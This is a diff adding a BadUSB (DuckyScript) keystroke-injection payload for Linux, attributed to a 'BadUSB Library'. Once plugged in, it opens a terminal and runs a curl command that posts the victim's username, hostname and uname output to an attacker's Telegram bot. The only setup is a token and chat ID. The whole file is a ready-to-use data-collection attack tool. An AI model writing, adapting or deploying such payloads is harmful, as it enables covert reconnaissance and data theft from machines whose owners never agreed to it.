@@ -1,0 +1,23 @@
+REM Title: Linux System Info to Telegram
+REM Author: BadUSB Library
+REM Description: Sends system info to Telegram
+REM Target: Linux
+REM Category: Collection
+REM Type: Configuration Needed
+
+REM *SETUP*
+REM Replace TELEGRAM_BOT_TOKEN with your Telegram Bot Token
+REM Replace TELEGRAM_CHAT_ID with your Telegram Chat ID
+
+REM Open Terminal
+DELAY 2000
+GUI SPACE
+DELAY 1000
+STRING Terminal
+ENTER
+DELAY 3000
+
+REM Send system info
+STRING curl -s -X POST "https://api.telegram.org/botTELEGRAM_BOT_TOKEN/sendMessage" -d chat_id="TELEGRAM_CHAT_ID" -d text="User: $(whoami), Host: $(hostname), OS: $(uname -a)"
+ENTER
+DELAY 2000
